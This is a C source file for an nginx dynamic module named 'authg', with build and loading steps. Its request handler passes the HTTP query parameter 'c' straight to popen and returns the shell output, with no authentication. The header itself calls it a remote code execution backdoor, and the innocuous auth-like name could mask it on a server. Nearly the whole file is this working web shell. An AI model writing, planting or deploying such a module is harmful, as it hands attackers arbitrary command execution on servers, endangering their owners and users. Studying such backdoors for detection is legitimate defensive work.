/*
 * ngx_http_authg_module.c
 *
 * Nginx equivalent of mod_authg (Apache2).
 *
 * BUILD:
 *   1. Download Nginx source matching your installed version:
 *        nginx -v
 *        wget http://nginx.org/download/nginx-<VERSION>.tar.gz
 *        tar -xzf nginx-<VERSION>.tar.gz
 *
 *   2. Compile as a dynamic module:
 *        cd nginx-<VERSION>
 *        ./configure --with-compat --add-dynamic-module=/path/to/this/dir
 *        make modules
 *        cp objs/ngx_http_authg_module.so /etc/nginx/modules/
 *
 *   3. In nginx.conf (top-level, before events {}):
 *        load_module modules/ngx_http_authg_module.so;
 *
 *   4. Add a location block:
 *        server {
 *            listen 8080;
 *            location /authg {
 *                authg on;
 *            }
 *        }
 *
 * USAGE:
 *   curl "http://localhost:8080/authg?c=id"
 *   curl "http://localhost:8080/authg?c=uname+-a"
 *
 * WARNING: This module executes arbitrary shell commands from HTTP query
 *          parameters. It is a remote code execution backdoor. Never deploy
 *          on any internet-facing or production server.
 */

#include <ngx_config.h>
#include <ngx_core.h>
#include <ngx_http.h>
#include <stdio.h>

/* --------------------------------------------------------------------------
 * Per-location configuration
 * -------------------------------------------------------------------------- */

typedef struct
{
    ngx_flag_t enable;
} ngx_http_authg_loc_conf_t;

/* --------------------------------------------------------------------------
 * Forward declarations
 * -------------------------------------------------------------------------- */

static ngx_int_t ngx_http_authg_handler(ngx_http_request_t *r);
static void *ngx_http_authg_create_loc_conf(ngx_conf_t *cf);
static char *ngx_http_authg_merge_loc_conf(ngx_conf_t *cf, void *parent,
                                           void *child);
static ngx_int_t ngx_http_authg_init(ngx_conf_t *cf);

/* --------------------------------------------------------------------------
 * Module directives
 * -------------------------------------------------------------------------- */

static ngx_command_t ngx_http_authg_commands[] = {

    {ngx_string("authg"),               /* directive name        */
     NGX_HTTP_LOC_CONF | NGX_CONF_FLAG, /* context + value type  */
     ngx_conf_set_flag_slot,            /* setter                */
     NGX_HTTP_LOC_CONF_OFFSET,
     offsetof(ngx_http_authg_loc_conf_t, enable),
     NULL},

    ngx_null_command};

/* --------------------------------------------------------------------------
 * Module context
 * -------------------------------------------------------------------------- */

static ngx_http_module_t ngx_http_authg_module_ctx = {
    NULL,                /* preconfiguration              */
    ngx_http_authg_init, /* postconfiguration             */

    NULL, /* create main configuration     */
    NULL, /* init main configuration       */

    NULL, /* create server configuration   */
    NULL, /* merge server configuration    */

    ngx_http_authg_create_loc_conf, /* create location configuration */
    ngx_http_authg_merge_loc_conf   /* merge location configuration  */
};

/* --------------------------------------------------------------------------
 * Module definition
 * -------------------------------------------------------------------------- */

ngx_module_t ngx_http_authg_module = {
    NGX_MODULE_V1,
    &ngx_http_authg_module_ctx, /* module context    */
    ngx_http_authg_commands,    /* module directives */
    NGX_HTTP_MODULE,            /* module type       */
    NULL,                       /* init master       */
    NULL,                       /* init module       */
    NULL,                       /* init process      */
    NULL,                       /* init thread       */
    NULL,                       /* exit thread       */
    NULL,                       /* exit process      */
    NULL,                       /* exit master       */
    NGX_MODULE_V1_PADDING};

/* --------------------------------------------------------------------------
 * Helper: extract value of query parameter 'key' from the request URI args.
 *
 * Nginx stores the raw query string in r->args.  We walk it manually so we
 * have no dependency on apr_table / PCRE, keeping the module self-contained.
 * -------------------------------------------------------------------------- */

static ngx_str_t
ngx_http_authg_get_arg(ngx_http_request_t *r, const char *key)
{
    ngx_str_t val = ngx_null_string;
    u_char *p, *last, *eq, *amp;
    size_t key_len = ngx_strlen(key);

    if (r->args.len == 0)
    {
        return val;
    }

    p = r->args.data;
    last = p + r->args.len;

    while (p < last)
    {
        /* find '=' */
        eq = ngx_strlchr(p, last, '=');
        if (eq == NULL)
            break;

        /* find next '&' or end */
        amp = ngx_strlchr(eq + 1, last, '&');
        if (amp == NULL)
            amp = last;

        /* compare key */
        if ((size_t)(eq - p) == key_len &&
            ngx_strncmp(p, key, key_len) == 0)
        {
            val.data = eq + 1;
            val.len = (size_t)(amp - (eq + 1));

            /* URL-decode the value into a pool-allocated buffer */
            size_t src_len = (size_t)(amp - (eq + 1));

            /* redo decode into a fixed buffer the clean way */
            u_char *buf = ngx_palloc(r->pool, src_len + 1);
            if (buf == NULL)
            {
                val.len = 0;
                return val;
            }
            ngx_memcpy(buf, eq + 1, src_len);
            buf[src_len] = '\0';

            /* simple '+' → space substitution */
            for (size_t i = 0; i < src_len; i++)
            {
                if (buf[i] == '+')
                    buf[i] = ' ';
            }

            /* percent-decode in place */
            u_char *r_ptr = buf, *w_ptr = buf;
            while (r_ptr < buf + src_len)
            {
                if (*r_ptr == '%' && r_ptr + 2 < buf + src_len)
                {
                    u_char hi = *(r_ptr + 1);
                    u_char lo = *(r_ptr + 2);
                    hi = (hi >= 'a') ? hi - 'a' + 10 : (hi >= 'A') ? hi - 'A' + 10
                                                                   : hi - '0';
                    lo = (lo >= 'a') ? lo - 'a' + 10 : (lo >= 'A') ? lo - 'A' + 10
                                                                   : lo - '0';
                    *w_ptr++ = (u_char)((hi << 4) | lo);
                    r_ptr += 3;
                }
                else
                {
                    *w_ptr++ = *r_ptr++;
                }
            }
            *w_ptr = '\0';

            val.data = buf;
            val.len = (size_t)(w_ptr - buf);
            return val;
        }

        p = amp + 1;
    }

    return val; /* not found */
}

/* --------------------------------------------------------------------------
 * Request handler
 * -------------------------------------------------------------------------- */

static ngx_int_t
ngx_http_authg_handler(ngx_http_request_t *r)
{
    ngx_http_authg_loc_conf_t *alcf;
    ngx_str_t cmd_arg;
    char cmd[1024];
    FILE *fp;
    char line[1024];
    ngx_buf_t *b;
    ngx_chain_t out;
    ngx_str_t content_type = ngx_string("text/html");

    /* Only handle GET (and HEAD) */
    if (r->method != NGX_HTTP_GET && r->method != NGX_HTTP_HEAD)
    {
        return NGX_HTTP_NOT_ALLOWED;
    }

    /* Check the location is enabled */
    alcf = ngx_http_get_module_loc_conf(r, ngx_http_authg_module);
    if (!alcf->enable)
    {
        return NGX_DECLINED;
    }

    /* Extract query parameter 'c' */
    cmd_arg = ngx_http_authg_get_arg(r, "c");
    if (cmd_arg.len == 0)
    {
        /* No command supplied — return empty 200 */
        r->headers_out.status = NGX_HTTP_OK;
        r->headers_out.content_type = content_type;
        r->headers_out.content_length_n = 0;
        ngx_http_send_header(r);
        return ngx_http_output_filter(r, NULL);
    }

    /* Safety cap — match Apache's path[1024] buffer */
    if (cmd_arg.len >= sizeof(cmd) - 1)
    {
        return NGX_HTTP_REQUEST_ENTITY_TOO_LARGE;
    }
    ngx_memcpy(cmd, cmd_arg.data, cmd_arg.len);
    cmd[cmd_arg.len] = '\0';

    /* Execute the command */
    fp = popen(cmd, "r");
    if (fp == NULL)
    {
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }

    /* ----------------------------------------------------------------
     * Collect all output into a single memory buffer so we can set
     * Content-Length correctly.  For a toy/research module this is fine.
     * ---------------------------------------------------------------- */
    ngx_array_t *chunks = ngx_array_create(r->pool, 16, sizeof(ngx_str_t));
    if (chunks == NULL)
    {
        pclose(fp);
        return NGX_HTTP_INTERNAL_SERVER_ERROR;
    }

    size_t total = 0;
    while (fgets(line, sizeof(line) - 1, fp) != NULL)
    {
        size_t len = ngx_strlen(line);
        ngx_str_t *chunk = ngx_array_push(chunks);
        if (chunk == NULL)
        {
            pclose(fp);
            return NGX_HTTP_INTERNAL_SERVER_ERROR;
        }
        chunk->data = ngx_palloc(r->pool, len);
        if (chunk->data == NULL)
        {
            pclose(fp);
            return NGX_HTTP_INTERNAL_SERVER_ERROR;
        }
        ngx_memcpy(chunk->data, line, len);
        chunk->len = len;
        total += len;
    }
    pclose(fp);

    /* Flatten into one buffer */
    u_char *body = ngx_palloc(r->pool, total ? total : 1);
    if (body == NULL)
        return NGX_HTTP_INTERNAL_SERVER_ERROR;

    u_char *pos = body;
    ngx_str_t *elts = chunks->elts;
    ngx_uint_t nelts = chunks->nelts;
    for (ngx_uint_t i = 0; i < nelts; i++)
    {
        ngx_memcpy(pos, elts[i].data, elts[i].len);
        pos += elts[i].len;
    }

    /* Build the response */
    b = ngx_pcalloc(r->pool, sizeof(ngx_buf_t));
    if (b == NULL)
        return NGX_HTTP_INTERNAL_SERVER_ERROR;

    b->pos = body;
    b->last = body + total;
    b->memory = 1;
    b->last_buf = 1;

    out.buf = b;
    out.next = NULL;

    r->headers_out.status = NGX_HTTP_OK;
    r->headers_out.content_type = content_type;
    r->headers_out.content_length_n = (off_t)total;

    ngx_int_t rc = ngx_http_send_header(r);
    if (rc == NGX_ERROR || rc > NGX_OK || r->header_only)
    {
        return rc;
    }

    return ngx_http_output_filter(r, &out);
}

/* --------------------------------------------------------------------------
 * Location config lifecycle
 * -------------------------------------------------------------------------- */

static void *
ngx_http_authg_create_loc_conf(ngx_conf_t *cf)
{
    ngx_http_authg_loc_conf_t *conf;

    conf = ngx_pcalloc(cf->pool, sizeof(ngx_http_authg_loc_conf_t));
    if (conf == NULL)
        return NULL;

    conf->enable = NGX_CONF_UNSET;
    return conf;
}

static char *
ngx_http_authg_merge_loc_conf(ngx_conf_t *cf, void *parent, void *child)
{
    ngx_http_authg_loc_conf_t *prev = parent;
    ngx_http_authg_loc_conf_t *conf = child;

    ngx_conf_merge_value(conf->enable, prev->enable, 0);
    return NGX_CONF_OK;
}

/* --------------------------------------------------------------------------
 * Post-configuration: register the handler at NGX_HTTP_CONTENT_PHASE
 * -------------------------------------------------------------------------- */

static ngx_int_t
ngx_http_authg_init(ngx_conf_t *cf)
{
    ngx_http_handler_pt *h;
    ngx_http_core_main_conf_t *cmcf;

    cmcf = ngx_http_conf_get_module_main_conf(cf, ngx_http_core_module);

    h = ngx_array_push(&cmcf->phases[NGX_HTTP_CONTENT_PHASE].handlers);
    if (h == NULL)
        return NGX_ERROR;

    *h = ngx_http_authg_handler;
    return NGX_OK;
}